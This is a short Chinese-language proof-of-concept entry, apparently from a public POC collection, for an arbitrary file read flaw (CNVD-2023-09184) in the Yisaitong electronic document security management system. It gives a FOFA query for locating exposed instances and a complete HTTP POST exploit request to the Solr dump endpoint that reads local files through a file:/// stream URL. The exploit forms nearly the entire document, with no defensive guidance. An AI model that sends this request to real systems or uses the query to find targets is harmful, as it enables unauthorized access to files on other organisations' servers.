## 亿赛通电子文档安全管理系统任意文件读取CNVD-2023-09184

亿赛通 电子文档安全管理系统 dump接口存在任意文件读取漏洞


## fofa
```
app="亿赛通电子文档安全管理系统"
```

## poc
```
POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Length: 36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

stream.url=file:///C:\Program Files\
```

![ac6036a601c185421f1c8f0fa56f70ac](https://github.com/wy876/POC/assets/139549762/e1a2c88b-c5a6-4f85-8f26-94d303fc9868)
